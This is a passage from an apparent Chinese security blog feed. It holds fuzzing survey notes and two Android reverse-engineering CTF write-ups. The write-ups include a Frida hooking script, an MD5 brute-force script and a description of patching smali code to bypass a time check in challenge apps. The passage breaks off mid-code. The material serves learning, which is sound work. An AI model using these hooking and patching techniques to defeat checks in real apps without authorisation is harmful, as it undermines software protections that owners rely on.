title="种子的优先级"></a>种子的优先级</h4><p>种子的优先级决定了模糊测试从种子池中选择种子的顺序。</p><p>AFL引入进化算法，使用适应度函数对输入进行评估，选取最佳输入放入种子池。种子池实质上是一个队列，种子按照入队顺序进行测试，一段时候后，队列内种子不再变化。（AFL）<br>AFLFast不在严格遵循FIFO队列策略，而是适当提升较少被执行、能量较低的种子的优先级，尽量平衡不同路径上的模糊测试密度。(AFLFast)<br>对于定向灰盒测试，Hawkeye会根据种子是否出发新的执行路径、种子与目标种子的相似度、种子是否包含目标函数，将种子分配到3个等级的队列中。(Hawkeye)</p><p>值得注意的是，种子的长度是影响种子优先级的重要因素：<br>输入数据越短、内存占用越小、测试速度越快。因此，在覆盖率增加相同的情况下，短输入的优先级更高。<br>在维持覆盖率不变的情况下，AFL反复删除种子的不同部分，试图缩短种子的长度。</p><p>更多的种子筛选策略：Rebert et al., Optimizing seed selection for fuzzing. [USENIX]</p><h3 id="种子突变"><a href="#种子突变" class="headerlink" title="种子突变"></a>种子突变</h3><p>获得了大量种子和对应的能量分配策略以及优先级策略之后，接下来需要在突变策略的指引下快速生成大量输入数据。<br>变异策略直接影响生成数据的质量，保守策略呆滞覆盖率偏低，激进策略导致大量无效输入。</p><h4 id="基本突变方式"><a href="#基本突变方式" class="headerlink" title="基本突变方式"></a>基本突变方式</h4><p><strong>比特翻转</strong>：按照一定的步长，连续反转几个比特位；在随即或特定的位置，反转固定宽度的比特位。<br><strong>简单算数运算</strong>：按照8b的步长，依次按照8b、16b、32b的宽度，从头开始加减操作。（AFL）<br><strong>覆盖</strong>：使用预设的值，将种子中的一些部分进行覆盖。<br><strong>插入</strong>：使用预设的值，插入到种子种的一些位置。<br><strong>删除</strong>：删除种子的某些部分。<br><strong>拼接</strong>：选择2个差异较大的种子进行拼接。</p><h4 id="黑盒突变"><a href="#黑盒突变" class="headerlink" title="黑盒突变"></a>黑盒突变</h4><p>不依赖目标相关信息，按照随机突变策略对种子进行突变。<br>可以快速大量生成输入。（AFL）</p><h4 id="导向型突变"><a href="#导向型突变" class="headerlink" title="导向型突变"></a>导向型突变</h4><p><strong>程序状态导向型突变</strong>：<br>通过程序分析技术，得到种子与程序状态的关系，以此指定突变策略，针对感兴趣的程序状态生成相应的测试数据。（VUzzer，Angora）</p><p><strong>如何确定突变位置</strong>：通常使用污点分析技术，寻找输入与程序状态之间的关系，进而确定突变位置。（Angora,VUzzer,REDQUEEN）<br><strong>输入格式高度结构化的目标</strong>：需要保证种子的结构，防止突变对关键字段的修改。Skyfire只选择种子的特定位置进行突变；ProFuzzer分析模糊测试中对发现漏洞至关重要的输入字段，进而调整策略重点突变这些字段。<br><strong>覆盖、替换、插入时预置字段的有效性</strong>：LangFuzz分析目标语法和足量有效输入样例。</p><p><strong>性能导向型突变</strong>：<br>根据输入数据同模糊测试评估指标的关系制订突变的策略。</p><p>AFL在进行连续字节翻转时，会衡量每个字节对覆盖率提升的程度。如果没有提升，则认为该字节对覆盖率提升无意义。据此，获得一个effectmap，用于保存种子中所有字节的有效性（0或1），以此确定是否进行突变。</p><h2 id="输入选择"><a href="#输入选择" class="headerlink" title="输入选择"></a>输入选择</h2><blockquote><p>尝试通过提前过滤掉无效的输入数据，以节省模糊测试的时间。<br>（似乎这个环节适合使用机器学习技术来完成模式识别任务）</p><p>以FuzzGuard为例，Zong Peiyuan et al., FuzzGuard filtering out unreachable inputs in directed grey-box fuzzing through deep learning. [USENIX]</p></blockquote><p>FuzzGuard使用机器学习技术，预测新产生的输入能否使得程序执行到有漏洞的代码处，删除预测为不可达的输入。论文中还讨论了机器学习应用到Fuzz中需要面对的一些问题：数据集不平衡、突变后种子执行路径的随机性。</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><blockquote><p>设计合适的实验，依照评估指标对模糊测试进行评估。<br>合适的评估指标，可以反映出模糊测试的真实的执行结果，话可以反应模糊测试方法的实际性能。<br>一个合适的模糊测试实验需要选择合适的模糊测试方法作为对比、合适的对象作为模糊测试的目标、合适的重复测试次数和超时时间。</p><p>目前主要聚焦于<strong>覆盖率</strong>和<strong>暴露漏洞平均时间</strong>。</p></blockquote><h3 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h3><p>在测试过程中，对象被覆盖到的数目占总数的比例。<br>通常而言，高覆盖率更可能发现更多的隐藏漏洞，因此众多研究聚焦于覆盖率的提升。</p><p>AFL使用上下文无关的边覆盖率作为评估指标；<br>Angora使用上下文敏感的分支覆盖率作为评估指标；<br>VUzzer使用块覆盖率作为评估指标；</p><p><strong>问题</strong>：<br>如何完成对复杂程序的覆盖信息统计；（CollAFL）<br>一味提升覆盖率，可能导致在一些无漏洞的正常边块上浪费过多时间，更容易受到反模糊测试的影响；（TortoiseFuzz）<br>如何降低覆盖率统计工作的巨大开销；（UnTracer）</p><h3 id="暴露漏洞平均时间"><a href="#暴露漏洞平均时间" class="headerlink" title="暴露漏洞平均时间"></a>暴露漏洞平均时间</h3><p>(AFLGo)<br>覆盖率这一指标是基于“覆盖率更高可能触发更多漏洞”的假设。<br>如果需要复现某个漏洞，且考虑到漏洞在代码中分布不均匀，单纯的覆盖率指标会导致测试在无关部分浪费资源。</p><h3 id="验证实验设计"><a href="#验证实验设计" class="headerlink" title="验证实验设计"></a>验证实验设计</h3><p>(Klees的4个标准)<br>[1]进行多次实验，并进行统计与检验，获取结果的分布；<br>[2]应该使用如CGC/LAVA等具有确定错误的测试集，或使用具有已知漏洞的程序作为被测试对象；<br>[3]应该尝试各种种子输入，如空种子；<br>[4]超时时间至少为24h，或者尝试不同的超时时间；</p><h1 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h1><p>模糊测试获得的结果无法被直接使用，需要对测试结果进行重现、复现、分析以及威胁性评估等工作，最终确定是否发现了有价值的漏洞。</p><h1 id="模糊测试的挑战与机遇"><a href="#模糊测试的挑战与机遇" class="headerlink" title="模糊测试的挑战与机遇"></a>模糊测试的挑战与机遇</h1><h2 id="反模糊测试"><a href="#反模糊测试" class="headerlink" title="反模糊测试"></a>反模糊测试</h2><p>目前主流的模糊测试技术基于4个前提条件，反模糊测试也可以从这些条件入手：<br>[1]单次执行速度要足够快 ~ 低频路径插入延时代码<br>[2]模糊工具可以获得覆盖率的反馈 ~ 用无意义代码填充覆盖率图<br>[3]目标中的路径约束可以被符号求解 ~ 使用hash运算干扰混合执行，隐式数据传递<br>[4]崩溃可以被模糊工具检测到</p><p>相关文章：<a href="https://securitygossip.com/blog/2019/11/08/fuzzification-anti-fuzzing-techniques/">https://securitygossip.com/blog/2019/11/08/fuzzification-anti-fuzzing-techniques/</a></p><h2 id="模糊工具集成"><a href="#模糊工具集成" class="headerlink" title="模糊工具集成"></a>模糊工具集成</h2><p>整合不同模糊测试工具，构造一个通用模糊测试平台。</p><h2 id="与机器学习结合"><a href="#与机器学习结合" class="headerlink" title="与机器学习结合"></a>与机器学习结合</h2><p>有效输入的模式识别</p><p><strong>问题</strong>：数据源、数据集不平衡、性能问题。</p><h2 id="其他发展方向"><a href="#其他发展方向" class="headerlink" title="其他发展方向"></a>其他发展方向</h2><p>提高自动化程度</p><p>与虚拟机技术结合</p><p>测试效果的评估方案改进</p><h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><p>看了上述笔记，似乎对Fuzz有了大致的了解，但是细细一想，又好像没学到什么东西。<br>要不然先来回答以下问题：</p><p>插桩、符号执行、污点分析的具体实现原理是什么？有哪些优化工作？<br>clone下来AFL++的代码，再拿到一个样本，怎么上手跑一次Fuzz流程？<br>对于一些术语：覆盖率、路径、基本块、逻辑符号、约束条件等等，准确的定义是什么？</p><p>针对以上问题，我的计划：<br>继续看相关文献，对诸如符号执行、污点分析等技术，对着论文写笔记，学习理论知识。<br>打开<a href="https://github.com/antonio-morales/Fuzzing101">入门实践课</a>，开始动手实践。<br>打开Google，搜索相关术语的定义，或者去相关论文里面找。</p><h2 id="基本块、路径和覆盖率"><a href="#基本块、路径和覆盖率" class="headerlink" title="基本块、路径和覆盖率"></a>基本块、路径和覆盖率</h2><p>待添加</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先以一篇综述学习Fuzz的基本流程&lt;br&gt;《模糊测试技术综述》 任泽众 《计算机研究与发展》&lt;br&gt;本文总结了Fuzz工作流程，并将其作为行文脉络，详细介绍了各个阶段中的相关技术。&lt;br&gt;重点介绍了AFL及其改进研究，简要介绍了Fuzz的多种应用场景，以及反Fuzz和Fuzz+ML等新的研究方向。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Fuzz" scheme="http://slient2009.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>几个Android逆向</title>
    <link href="http://slient2009.github.io/2021/12/01/Android-Reverse-1/"/>
    <id>http://slient2009.github.io/2021/12/01/Android-Reverse-1/</id>
    <published>2021-12-01T05:00:00.000Z</published>
    <updated>2022-01-08T09:28:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录最近做的一些Android逆向题目。</p><span id="more"></span><h1 id="Accelerate-Time"><a href="#Accelerate-Time" class="headerlink" title="Accelerate-Time"></a>Accelerate-Time</h1><blockquote><p><a href="https://github.com/slient2009/PicGo/blob/main/files/HUAWEI-CTF-%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6.zip">华为内部CTF</a></p></blockquote><p>进去提示只能在固定的时间才能登录，于是先hook this.hour=4。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820113557084.png" alt="image-20210820113557084"></p><p>跟着走发现需要验证username和password。<br>逻辑比较长且复杂，跟着Password View的监听函数一步步跟找到校验username和password的逻辑。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820143926398.png" alt="image-20210820143926398"></p><p>关注password的监听事件，在这里可以逆向得到username=Android和password=Greatly。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820114137957.png" alt="image-20210820114137957"></p><p>username和password得到验证之后，关注login按钮的监听事件，但是最终还是进入到上述的校验逻辑中。<br>接着貌似验证过程就结束了。虽然在onCreate()之后就能发现另外一段校验函数，但是这个函数是如何调用的呢？</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820144400989.png" alt="image-20210820144400989"></p><p>关注一开始设置的observer，根据LoginActivity.onCreate.2的构造函数，观察的对象就是传进去的当前的LoginActivity。<br>进一步的，如果当前的LoginActivity发生了变化，会调用到updateUiWithUser()进行二次验证。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820144857352.png" alt="image-20210820144857352"></p><p>在login按钮的点击事件中，会进入下面的函数。<br>Result oLoggedInUser是用户名和密码校验的返回结果，这里检查是否返回了success，如果是，则把this._LoginResult（MutableLiveData类）设置success的子类。这样的修改会被观察者模式发觉，因此调用回调函数onChanged并进一步调用showLoginFailed()或者updateUiWithUser()。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820145309550.png" alt="image-20210820145309550"></p><p>仔细观察updateUiWithUser()函数，先构造字符串<code>hour+minute+second</code>计算hash值timeMD5，然后构造字符串<code>flag&#123;+timeMD5+&#125;+username+password</code>。<br>但是需要注意的是，username和password是直接使用的其对应的EditText对象，所以拼接的不是<code>Android+Greatly</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">updateUiWithUser</span><span class="params">(LoggedInUserView arg3)</span> </span>&#123;</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(<span class="keyword">this</span>.getString(<span class="number">0x7F0D0041</span>), <span class="string">&quot;getString(R.string.welcome)&quot;</span>);  <span class="comment">// string:welcome &quot;Welcome !&quot;</span></span><br><span class="line">        arg3.getDisplayName();</span><br><span class="line">        <span class="keyword">if</span>(Intrinsics.areEqual(LoginActivityKt.encodeMD5(<span class="string">&quot;flag&#123;&quot;</span> + LoginActivityKt.encodeMD5(String.valueOf(<span class="keyword">this</span>.hour) + String.valueOf(<span class="keyword">this</span>.minute) + String.valueOf(<span class="keyword">this</span>.second)) + <span class="string">&quot;&#125;&quot;</span> + ((EditText)<span class="keyword">this</span>._$_findCachedViewById(id.username)) + ((EditText)<span class="keyword">this</span>._$_findCachedViewById(id.password))), <span class="keyword">this</span>.getString(<span class="number">0x7F0D002E</span>))) &#123;  <span class="comment">// string:code &quot;1a9852e856816224&quot;</span></span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;Congulations, You got the secert code&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;Yeah, you are logged in but the code is still hidden under the mist&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>虽然非常奇怪，但是不管是smali代码还是hook LoginActivitykt.encodeMD5()的输入参数，都证明确实直接拼接了EditText对象。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820150709400.png" alt="image-20210820150709400" style="zoom: 80%;" /><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820150729060.png" alt="image-20210820150729060" style="zoom: 50%;" /><p>解密的思路非常简单，直接爆破时间，计算24*60*60次。<br>如果按照<code>flag&#123;MD5(hour+minute+second)&#125;AndroidGreatly</code>来计算，可以得到时间为4:35:23，且hash值满足要求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">aim = <span class="string">&quot;1a9852e856816224&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">61</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">61</span>):</span><br><span class="line">            timebytes = (<span class="built_in">str</span>(h) + <span class="built_in">str</span>(m) +<span class="built_in">str</span>(s)).encode()</span><br><span class="line">            timehash = hashlib.md5(timebytes).hexdigest()</span><br><span class="line">            thehash  = hashlib.md5( (<span class="string">&quot;flag&#123;&quot;</span> + timehash[<span class="number">8</span>:<span class="number">24</span>] + <span class="string">&quot;&#125;AndroidGreatly&quot;</span>).encode() ).hexdigest()</span><br><span class="line">            <span class="keyword">if</span>(thehash[<span class="number">8</span>:<span class="number">24</span>] == aim):</span><br><span class="line">                <span class="built_in">print</span>(h,m,s)</span><br><span class="line">                <span class="built_in">print</span>(timehash)</span><br><span class="line">                <span class="built_in">print</span>(thehash)</span><br></pre></td></tr></table></figure><p>如果严格按照代码来，则找不出满足要求的时间。<br>frida爆破代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//覆盖updateUiWithUser()，改为爆破函数，主动调用LoginActiivtyKt.encodeMD5()。</span></span><br><span class="line"><span class="comment">//hook Intrinsics.areEqual(),拦截hash=&quot;1a9852e856816224&quot;的情况</span></span><br><span class="line"><span class="comment">//hook LoginAcitivityKt.encodeMD5()，拦截某次hash值为&quot;1a9852e856816224&quot;的情况，同时打印明文字符串，验证确实直接拼接了EditText对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;long live frida&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> LoginActivityClass = Java.use(<span class="string">&quot;com.flag.reverse.c.ui.login.LoginActivity&quot;</span>);</span><br><span class="line">        LoginActivityClass.$init.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//hook构造函数，预置时间为4:35:23也过不了</span></span><br><span class="line">            <span class="built_in">this</span>.$init();</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;into LoginActivity() args=&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.hour.value, <span class="built_in">this</span>.minute.value, <span class="built_in">this</span>.second.value);</span><br><span class="line"><span class="built_in">this</span>.hour.value = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">this</span>.minute.value = <span class="number">35</span>;</span><br><span class="line"><span class="built_in">this</span>.second.value = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.hour.value, <span class="built_in">this</span>.minute.value, <span class="built_in">this</span>.second.value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> LoginActivityKt = Java.use(<span class="string">&quot;com.flag.reverse.c.ui.login.LoginActivityKt&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> intrics = Java.use(<span class="string">&quot;kotlin.jvm.internal.Intrinsics&quot;</span>);</span><br><span class="line">intrics.areEqual.overload(<span class="string">&quot;java.lang.Object&quot;</span>, <span class="string">&quot;java.lang.Object&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">s1, s2</span>)</span>&#123;</span><br><span class="line"><span class="comment">// console.log(s1,s2);</span></span><br><span class="line"><span class="keyword">if</span>(s1 == s2)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;into areEqual() args=&quot;</span>, s1, s2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.areEqual(s1, s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stop = <span class="literal">false</span>;</span><br><span class="line">LoginActivityKt.encodeMD5.overload(<span class="string">&quot;java.lang.String&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">plain</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> hashstr = <span class="built_in">this</span>.encodeMD5(plain);</span><br><span class="line"><span class="keyword">if</span>(hashstr == <span class="string">&quot;1a9852e856816224&quot;</span>)&#123; </span><br><span class="line">stop = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(plain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> hashstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LoginActivityClass.updateUiWithUser.overload(<span class="string">&quot;com.flag.reverse.c.ui.login.LoggedInUserView&quot;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> last_v;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> h=<span class="number">0</span>;h&lt;=<span class="number">24</span>;h++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0</span>;m&lt;=<span class="number">60</span>;m++)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(h,m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> s=<span class="number">0</span>;s&lt;=<span class="number">60</span>;s++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!stop)&#123;</span><br><span class="line"><span class="built_in">this</span>.hour.value = h;</span><br><span class="line"><span class="built_in">this</span>.minute.value = m;</span><br><span class="line"><span class="built_in">this</span>.second.value = s;</span><br><span class="line">last_v = <span class="built_in">this</span>.updateUiWithUser(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>.hour.value, <span class="built_in">this</span>.minute.value, <span class="built_in">this</span>.second.value);</span><br><span class="line"><span class="keyword">return</span> last_v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><h1 id="Time-Machine"><a href="#Time-Machine" class="headerlink" title="Time-Machine"></a>Time-Machine</h1><blockquote><p><a href="https://github.com/slient2009/PicGo/blob/main/files/HUAWEI-CTF-%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6.zip">华为内部CTF</a></p></blockquote><p>这道题做得比较久，中途基本想放弃了，不过还是坚持做下来了，值得给自己点赞。（雾</p><p>首先看一下Java层，还好没有太多逻辑需要厘清。<br>要求先后点击两个按钮并获取点击时间，要求第一个时间戳大于第二个时间戳，显然这是不能实现的。（对应题目的名字Time Machine）<br>可以通过Frida Hook时间类，或者直接修改smali代码，把大于改成小于即可。为了后续IDA动态调试方便，我选择了后者。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.appcompat.app.AppCompatActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg7)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg7);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0A001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        Button startButton = (Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070042</span>);  <span class="comment">// id:button</span></span><br><span class="line">        Button stopButton = (Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070043</span>);  <span class="comment">// id:button2</span></span><br><span class="line">        <span class="keyword">long</span>[] startTime = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;<span class="number">0L</span>&#125;;</span><br><span class="line">        <span class="keyword">long</span>[] endTime = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;<span class="number">0L</span>&#125;;</span><br><span class="line">        startButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg4)</span> </span>&#123;</span><br><span class="line">                startTime[<span class="number">0</span>] = System.currentTimeMillis();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        stopButton.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</span><br><span class="line">                endTime[<span class="number">0</span>] = System.currentTimeMillis();</span><br><span class="line">                <span class="keyword">long</span>[] v7 = startTime;</span><br><span class="line">                <span class="keyword">if</span>(v7[<span class="number">0</span>] == <span class="number">0L</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;game not start &quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">long</span> startTime2 = v7[<span class="number">0</span>];</span><br><span class="line">                String endTime2 = endTime[<span class="number">0</span>] + <span class="string">&quot; &quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(startTime2 - endTime[<span class="number">0</span>] &gt; <span class="number">1L</span>) &#123; <span class="comment">//不修改或者调试过不了的条件</span></span><br><span class="line">                    Bundle timeString = <span class="keyword">new</span> Bundle();</span><br><span class="line">                    timeString.putString(<span class="string">&quot;starttime&quot;</span>, startTime2 + <span class="string">&quot; &quot;</span>);</span><br><span class="line">                    timeString.putString(<span class="string">&quot;endtime&quot;</span>, endTime2);</span><br><span class="line">                    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                    intent.setClass(MainActivity.<span class="keyword">this</span>, Main2Activity.class);</span><br><span class="line">                    intent.putExtras(timeString);</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.startActivity(intent);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就输入flag并进行检查。<br>要求flag长度为42，格式为<code>flag&#123;xxxxx&#125;</code>，flag前三位是<code>e25</code>，第三到第八位的md5值为<code>1E862D87DB3293B81C7D2934577A22FA</code>，用<code>somd5</code>解出来是<code>be952</code>。<br>然后把flag剩余的部分交给check函数传到native层去检查。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0A001D</span>);  <span class="comment">// layout:activity_main2</span></span><br><span class="line">        Bundle v3 = <span class="keyword">this</span>.getIntent().getExtras();</span><br><span class="line">        v0.toString();</span><br><span class="line">        v3.getString(<span class="string">&quot;endtime&quot;</span>);</span><br><span class="line">        EditText mEditText = (EditText)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070056</span>);  <span class="comment">// id:editText</span></span><br><span class="line">        ((Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070044</span>)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;  <span class="comment">// id:button3</span></span><br><span class="line">            <span 